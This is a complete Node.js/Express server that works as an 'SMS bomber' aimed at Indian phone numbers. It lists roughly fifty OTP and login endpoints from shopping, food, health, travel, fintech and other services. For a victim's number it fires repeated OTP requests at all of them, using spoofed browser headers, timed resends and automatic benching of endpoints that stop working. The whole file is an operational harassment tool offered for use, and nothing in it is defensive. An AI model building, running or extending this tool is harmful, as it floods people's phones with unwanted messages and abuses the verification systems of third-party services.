import express from 'express';
import axios from 'axios';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PUBLIC_DIR = path.join(__dirname, 'public');

const PORT = Number(process.env.PORT) || 3000;
const HOST = process.env.HOST || '0.0.0.0';
const REQ_TIMEOUT = Number(process.env.REQ_TIMEOUT) || 12000;

const DEFAULTS = {
  repeat: 5,
  stagger: 70,
  resendGap: 2500,
};

const BENCH_AFTER = 3;
const BENCH_MS = 10 * 60 * 1000;

const UA =
  'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 ' +
  '(KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36';

const app = express();
app.disable('x-powered-by');

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'content-type');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use(express.json({ limit: '16kb' }));

/* ================= helpers ================= */

const sleep = ms => new Promise(r => setTimeout(r, ms));
const clamp = (v, lo, hi) => Math.min(Math.max(v, lo), hi);

function normalize(raw) {
  let d = String(raw ?? '').replace(/\D/g, '');
  if (!d) return null;
  if (d.startsWith('00')) d = d.slice(2);
  if (d.length === 11 && d.startsWith('0')) d = d.slice(1);
  if (d.length === 10) d = '91' + d;
  if (d.length < 11 || d.length > 15) return null;
  return { ten: d.slice(-10), cc: d, plus: '+' + d };
}

function H(origin, referer) {
  let o;
  try { o = new URL(origin).origin; } catch { o = origin; }
  return { origin: o, referer: referer || o + '/' };
}

const tpl = (s, n) => String(s)
  .replace(/\{ten\}/g, n.ten)
  .replace(/\{cc\}/g, n.cc)
  .replace(/\{plus\}/g, n.plus);

function judge(status, body) {
  if (status < 200 || status >= 300) return { ok: false, note: 'http ' + status };
  if (body && typeof body === 'object') {
    if (body.success === false) return { ok: false, note: 'success:false' };
    if (body.status === false) return { ok: false, note: 'status:false' };
    if (body.ok === false) return { ok: false, note: 'ok:false' };
    if (typeof body.error === 'string' && body.error.trim())
      return { ok: false, note: 'error: ' + body.error.trim().slice(0, 40) };
    if (body.errors) {
      const c = Array.isArray(body.errors) ? body.errors.length : Object.keys(body.errors).length;
      if (c) return { ok: false, note: 'errors' };
    }
  }
  return { ok: true, note: 'ok' };
}

function snippet(body) {
  if (body === undefined || body === null || body === '') return '';
  let s;
  try { s = typeof body === 'string' ? body : JSON.stringify(body); }
  catch { s = String(body); }
  s = s.replace(/\s+/g, ' ').trim();
  return s.length > 140 ? s.slice(0, 140) + '…' : s;
}

/* ================= health stats / benching ================= */

const stats = new Map();

function getStat(name) {
  let s = stats.get(name);
  if (!s) { s = { ok: 0, fail: 0, streak: 0, benchedUntil: 0 }; stats.set(name, s); }
  return s;
}

function record(name, ok, benchable) {
  const s = getStat(name);
  if (ok) {
    s.ok++; s.streak = 0; s.benchedUntil = 0;
    return;
  }
  s.fail++;
  if (benchable) {
    s.streak++;
    if (s.streak >= BENCH_AFTER) s.benchedUntil = Date.now() + BENCH_MS;
  }
}

const isBenched = name => {
  const s = stats.get(name);
  return !!s && s.benchedUntil > Date.now();
};

const benchWorthy = r => r.status === 0 || r.status === 404 || r.status >= 500;

/* ================= endpoints ================= */

const endpoints = [
  /* ---- shopping ---- */
  { name: 'Flipkart', method: 'POST',
    url: 'https://www.flipkart.com/api/5/user/otp/generate',
    headers: { ...H('https://www.flipkart.com'), 'x-user-agent': 'Mozilla/5.0 FKUA/website/41/website/Desktop' },
    form: n => ({ loginId: '+91' + n.ten }) },

  { name: 'Snapdeal', method: 'POST',
    url: 'https://www.snapdeal.com/sendOTP',
    headers: { ...H('https://www.snapdeal.com', 'https://www.snapdeal.com/iframeLogin'), 'x-requested-with': 'XMLHttpRequest' },
    form: n => ({ emailId: '', mobileNumber: n.ten, purpose: 'LOGIN_WITH_MOBILE_OTP' }) },

  { name: 'Myntra', method: 'POST',
    url: 'https://www.myntra.com/gateway/v2/user/otp/generate',
    headers: { ...H('https://www.myntra.com'), 'x-myntraweb': 'Yes' },
    json: n => ({ mobileNumber: n.ten }) },

  { name: 'Ajio', method: 'POST',
    url: 'https://www.ajio.com/api/auth/sendOtp',
    headers: H('https://www.ajio.com'),
    json: n => ({ mobileNumber: n.ten, isResend: false }), resendKey: 'isResend' },

  { name: 'Meesho', method: 'POST',
    url: 'https://www.meesho.com/api/v1/otp/send',
    headers: H('https://www.meesho.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'TataCliq', method: 'POST',
    url: 'https://www.tatacliq.com/api/v1/user/otp/generate',
    headers: H('https://www.tatacliq.com'),
    json: n => ({ mobileNumber: n.ten }) },

  { name: 'Nykaa', method: 'POST',
    url: 'https://www.nykaa.com/app-api/index.php?controller=user&action=send_otp',
    headers: H('https://www.nykaa.com'),
    form: n => ({ mobile_number: n.ten }) },

  { name: 'Purplle', method: 'POST',
    url: 'https://www.purplle.com/api/v1/user/send-otp',
    headers: H('https://www.purplle.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Bewakoof', method: 'POST',
    url: 'https://www.bewakoof.com/api/v1.0/user/otp/generate',
    headers: H('https://www.bewakoof.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Lenskart', method: 'POST',
    url: 'https://api.lenskart.com/v1/customers/otp/generate',
    headers: H('https://www.lenskart.com'),
    json: n => ({ phone: n.ten, isd_code: '91' }) },

  { name: 'FirstCry', method: 'POST',
    url: 'https://www.firstcry.com/api/otp/send',
    headers: H('https://www.firstcry.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Fynd', method: 'POST',
    url: 'https://api.fynd.com/service/application/auth/send-otp',
    headers: H('https://www.fynd.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Naaptol', method: 'GET',
    url: 'https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile={ten}' },

  { name: 'HomeShop18', method: 'POST',
    url: 'https://mbe.homeshop18.com/services/secure/user/generate/otp',
    headers: { 'x-hs18-app-version': '3.1.0', 'x-hs18-app-id': '0',
               'x-hs18-device-version': '25', 'x-hs18-app-platform': 'androidApp' },
    form: n => ({ submit: 'submit', identity: n.ten, otpType: 'SIGNUP_OTP' }) },

  { name: 'IffcoBazar', method: 'POST',
    url: 'https://www.iffcobazar.in/login_otp.html',
    headers: H('https://www.iffcobazar.in', 'https://www.iffcobazar.in/login_otp.html'),
    form: n => ({ submitted: 'yes', phone_no: n.ten }) },

  { name: 'Spencers', method: 'GET',
    url: 'https://www.spencers.in/genOtp/genOTP.php?action=genOTP&phone={ten}' },

  /* ---- food & grocery ---- */
  { name: 'Zomato', method: 'POST',
    url: 'https://www.zomato.com/php/o2_api/otp.php',
    headers: H('https://www.zomato.com'),
    form: n => ({ phoneNumber: n.ten, country_id: '1', type: 'sendOtp' }) },

  { name: 'Swiggy', method: 'POST',
    url: 'https://www.swiggy.com/dapi/auth/sms-otp',
    headers: H('https://www.swiggy.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Blinkit', method: 'POST',
    url: 'https://api.grofers.com/v2/web/auth/send_otp',
    headers: H('https://blinkit.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'Zepto', method: 'POST',
    url: 'https://api.zeptonow.com/api/v1/auth/send-otp',
    headers: H('https://www.zeptonow.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'Dominos', method: 'POST',
    url: 'https://www.dominos.co.in/api/v1/customer/send-otp',
    headers: H('https://www.dominos.co.in'),
    json: n => ({ mobile: n.ten }) },

  { name: 'BigBasket', method: 'POST',
    url: 'https://www.bigbasket.com/api/v1/otp/send',
    headers: H('https://www.bigbasket.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'JioMart', method: 'POST',
    url: 'https://www.jiomart.com/api/v1/otp/send',
    headers: H('https://www.jiomart.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Licious', method: 'POST',
    url: 'https://www.licious.in/api/v1/otp/send',
    headers: H('https://www.licious.in'),
    json: n => ({ phone: n.ten }) },

  /* ---- health ---- */
  { name: 'PharmEasy', method: 'POST',
    url: 'https://pharmeasy.in/api/v1/send_otp',
    headers: H('https://pharmeasy.in'),
    json: n => ({ phone: n.ten }) },

  { name: 'Netmeds', method: 'POST',
    url: 'https://www.netmeds.com/sociallogin/popup/checkmobileno/',
    headers: { ...H('https://www.netmeds.com', 'https://www.netmeds.com/customer/account/create/'), 'x-requested-with': 'XMLHttpRequest' },
    form: n => ({ register_mobileno: n.ten }) },

  { name: 'Tata1mg', method: 'POST',
    url: 'https://www.1mg.com/api/v1/otp/send',
    headers: H('https://www.1mg.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'HealthKart', method: 'GET',
    url: 'https://www.healthkart.com/api/user/login/send/otp/{ten}?trackingSource=HM-LPOPUP' },

  { name: 'Practo', method: 'POST',
    url: 'https://www.practo.com/api/v1/otp/send',
    headers: H('https://www.practo.com'),
    json: n => ({ phone: n.ten }) },

  /* ---- travel ---- */
  { name: 'Goibibo', method: 'POST',
    url: 'https://www.goibibo.com/common/downloadsms/',
    headers: H('https://www.goibibo.com', 'https://www.goibibo.com/mobile/?sms=success'),
    form: n => ({ mbl: n.ten }) },

  { name: 'Redbus', method: 'POST',
    url: 'https://www.redbus.in/api/sendOtp',
    headers: H('https://www.redbus.in'),
    form: n => ({ mobile: n.ten }) },

  { name: 'Treebo', method: 'POST',
    url: 'https://www.treebo.com/api/v2/auth/login/otp/',
    headers: { ...H('https://www.treebo.com', 'https://www.treebo.com/login/'), authorization: 'Bearer null' },
    json: n => ({ phone_number: n.ten }) },

  { name: 'MakeMyTrip', method: 'POST',
    url: 'https://www.makemytrip.com/api/otp/send',
    headers: H('https://www.makemytrip.com'),
    json: n => ({ phone: n.ten }) },

  /* ---- fintech ---- */
  { name: 'Mobikwik', method: 'POST',
    url: 'https://appapi.mobikwik.com/p/account/otp/cell',
    headers: { 'x-app-ver': '1', 'x-mclient': '1' },
    json: n => ({ cell: n.ten }) },

  { name: 'Paisabazaar', method: 'POST',
    url: 'https://myaccount.paisabazaar.com/my-account/',
    headers: { ...H('https://myaccount.paisabazaar.com'), 'x-requested-with': 'XMLHttpRequest' },
    form: n => ({ mobile_number: n.ten, step: 'send_password', request_page: 'landing' }) },

  { name: 'Cashify', method: 'POST',
    url: 'https://www.cashify.in/api/v1/send-otp',
    headers: H('https://www.cashify.in'),
    json: n => ({ phone: n.ten }) },

  { name: 'Groww', method: 'POST',
    url: 'https://groww.in/v1/api/otp/generate',
    headers: H('https://groww.in'),
    json: n => ({ phone: n.ten }) },

  { name: 'Upstox', method: 'POST',
    url: 'https://api.upstox.com/login/openapi/v2/login',
    headers: H('https://upstox.com'),
    json: n => ({ mobile_number: n.cc }) },

  { name: 'Zerodha', method: 'POST',
    url: 'https://kite.zerodha.com/api/login',
    headers: H('https://kite.zerodha.com'),
    form: n => ({ user_id: n.ten, password: 'abc123' }) },

  { name: 'Cred', method: 'POST',
    url: 'https://api.cred.club/apiv1/cred/otp/generate',
    headers: H('https://cred.club'),
    json: n => ({ phone: n.ten }) },

  { name: 'Policybazaar', method: 'POST',
    url: 'https://www.policybazaar.com/api/v1/otp/send',
    headers: H('https://www.policybazaar.com'),
    json: n => ({ mobile: n.ten }) },

  /* ---- learning ---- */
  { name: 'Unacademy', method: 'POST',
    url: 'https://unacademy.com/api/v3/user/send_otp',
    headers: H('https://unacademy.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Vedantu', method: 'POST',
    url: 'https://api.vedantu.com/v1/users/otp',
    headers: H('https://www.vedantu.com'),
    json: n => ({ mobile: n.ten }) },

  { name: 'Toppr', method: 'POST',
    url: 'https://api.toppr.com/v1/otp/send',
    headers: H('https://www.toppr.com'),
    json: n => ({ phone: n.ten }) },

  /* ---- local services ---- */
  { name: 'UrbanCompany', method: 'POST',
    url: 'https://www.urbancompany.com/api/v1/otp/send',
    headers: H('https://www.urbancompany.com'),
    json: n => ({ phone: n.ten }) },

  { name: 'NoBroker', method: 'POST',
    url: 'https://www.nobroker.in/api/v1/otp/send',
    headers: H('https://www.nobroker.in'),
    json: n => ({ phone: n.ten }) },

  { name: 'Sulekha', method: 'GET',
    url: 'https://myaccount.sulekha.com/network/userauthv1.aspx?mode=sendvcode&mobilenumber={ten}&rnd=0' },

  { name: 'Justdial', method: 'GET',
    url: 'https://www.justdial.com/functions/ajxandroid.php?phn={ten}&em=a%40b.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile' },

  { name: 'Rapido', method: 'POST',
    url: 'https://api.rapido.bike/v1/otp/send',
    headers: H('https://rapido.bike'),
    json: n => ({ phone: n.ten }) },

  { name: 'TataDocomo', method: 'GET',
    url: 'https://www.tatadocomo.com/INonRender/Personal_MydocomoApp/GenerateOTP?mobile={ten}' },

  { name: 'Hike', method: 'POST',
    url: 'https://api.im.hike.in/v3/account/validate?digits=4',
    json: n => ({ method: 'pin', msisdn: '+91' + n.ten }) },

  { name: 'NDTV', method: 'GET',
    url: 'https://www.narendramodi.in/site/senddnldlink?contact_no=91{ten}' },
];

/* ================= request builder ================= */

function buildRequest(ep, n, attempt) {
  const isResend = attempt > 1;
  const cfg = {
    method: ep.method || 'GET',
    url: tpl(ep.url, n),
    timeout: REQ_TIMEOUT,
    maxRedirects: 5,
    validateStatus: () => true,
    responseType: 'text',
    transformResponse: [d => {
      if (typeof d !== 'string') return d;
      try { return JSON.parse(d); } catch { return d; }
    }],
    headers: {
      'user-agent': UA,
      accept: 'application/json, text/plain, */*',
      'accept-language': 'en-IN,en;q=0.9',
      ...(ep.headers || {}),
    },
  };

  if (isResend) cfg.headers['cache-control'] = 'no-cache';

  const raw = ep.json ? ep.json(n, attempt) : ep.form ? ep.form(n, attempt) : null;

  if (raw) {
    const payload = { ...raw };
    if (isResend && ep.resendKey) payload[ep.resendKey] = true;
    if (ep.json) {
      cfg.data = JSON.stringify(payload);
      cfg.headers['content-type'] = 'application/json';
    } else {
      cfg.data = new URLSearchParams(payload).toString();
      cfg.headers['content-type'] = 'application/x-www-form-urlencoded';
    }
  } else if (isResend) {
    cfg.params = { _t: Date.now() };
  }
  return cfg;
}

async function hit(ep, n, attempt) {
  const t0 = Date.now();
  try {
    const resp = await axios(buildRequest(ep, n, attempt));
    const verdict = judge(resp.status, resp.data);
    return {
      name: ep.name, attempt, ok: verdict.ok, note: verdict.note,
      status: resp.status, ms: Date.now() - t0, snippet: snippet(resp.data),
    };
  } catch (err) {
    return {
      name: ep.name, attempt, ok: false,
      note: err.code || err.message || 'network',
      status: err.response?.status || 0,
      ms: Date.now() - t0, snippet: '',
    };
  }
}

/* ================= core ================= */

async function runBomb(n, opts, onEvent) {
  const { repeat, stagger, resendGap, skipDead } = opts;

  const pool = skipDead ? endpoints.filter(ep => !isBenched(ep.name)) : endpoints;
  const active = pool.length ? pool : endpoints;
  const total = active.length * repeat;
  const started = Date.now();

  onEvent({
    type: 'start', number: n.plus, services: active.length,
    total, repeat, skipped: endpoints.length - active.length,
  });

  let done = 0, sent = 0, failed = 0;
  const results = [];
  const jobs = [];
  let i = 0;

  for (const ep of active) {
    const base = i * stagger;
    for (let a = 1; a <= repeat; a++) {
      const delay = base + (a - 1) * resendGap;
      jobs.push((async () => {
        if (delay > 0) await sleep(delay);
        const r = await hit(ep, n, a);
        done++;
        r.ok ? sent++ : failed++;
        record(ep.name, r.ok, benchWorthy(r));
        results.push(r);
        onEvent({ type: 'result', done, total, sent, failed, ...r });
      })());
    }
    i++;
  }

  await Promise.all(jobs);

  const summary = { type: 'done', total, sent, failed, elapsed: Date.now() - started };
  onEvent(summary);
  return { ...summary, number: n.plus, results };
}

function readOpts(body) {
  const b = body || {};
  return {
    repeat: clamp(parseInt(b.repeat, 10) || DEFAULTS.repeat, 1, 10),
    stagger: clamp(Number(b.stagger) || DEFAULTS.stagger, 0, 500),
    resendGap: clamp(Number(b.resendGap) || DEFAULTS.resendGap, 800, 8000),
    skipDead: b.skipDead !== false,
  };
}

/* ================= routes ================= */

app.get('/api/health', (_req, res) => {
  const live = endpoints.filter(e => !isBenched(e.name)).length;
  res.json({ ok: true, services: endpoints.length, live, benched: endpoints.length - live });
});

app.get('/api/services', (_req, res) => {
  res.json(endpoints.map(e => ({ name: e.name, benched: isBenched(e.name) })));
});

app.get('/api/stats', (_req, res) => {
  res.json([...stats].map(([name, s]) => ({
    name, ok: s.ok, fail: s.fail, benched: s.benchedUntil > Date.now(),
  })));
});

app.post('/api/stats/reset', (_req, res) => {
  stats.clear();
  res.json({ ok: true });
});

app.post('/api/bomb', async (req, res) => {
  const n = normalize((req.body || {}).number);
  if (!n) {
    return res.status(400).json({
      error: 'Invalid number. 10-digit Indian number ya full E.164 (+919876543210) daalo.',
    });
  }

  res.setHeader('content-type', 'application/x-ndjson; charset=utf-8');
  res.setHeader('cache-control', 'no-cache, no-transform');
  res.setHeader('x-accel-buffering', 'no');
  if (res.flushHeaders) res.flushHeaders();

  const write = o => { if (!res.writableEnded) res.write(JSON.stringify(o) + '\n'); };

  try {
    await runBomb(n, readOpts(req.body), write);
  } catch (err) {
    write({ type: 'error', error: err.message });
  }
  res.end();
});

app.post('/api/bomb/sync', async (req, res) => {
  const n = normalize((req.body || {}).number);
  if (!n) return res.status(400).json({ error: 'invalid number' });

  const out = await runBomb(n, readOpts(req.body), () => {});
  res.json(out);
});

app.use('/api', (_req, res) => res.status(404).json({ error: 'unknown api route' }));

app.use(express.static(PUBLIC_DIR, { extensions: ['html'] }));

app.use((err, _req, res, _next) => {
  if (err && err.type === 'entity.parse.failed') {
    return res.status(400).json({ error: 'malformed JSON body' });
  }
  console.error('[error]', err);
  res.status(500).json({ error: 'server error' });
});

/* ================= start ================= */

const server = app.listen(PORT, HOST, () => {
  console.log('OTP Sender running -> http://localhost:' + PORT);
  console.log('services: ' + endpoints.length + ' | defaults: repeat=' +
    DEFAULTS.repeat + ' stagger=' + DEFAULTS.stagger + 'ms resendGap=' + DEFAULTS.resendGap + 'ms');
});

server.on('error', err => {
  if (err.code === 'EADDRINUSE') {
    console.error('Port ' + PORT + ' busy. Try: PORT=3001 npm start');
  } else {
    console.error('[listen]', err.message);
  }
  process.exit(1);
});
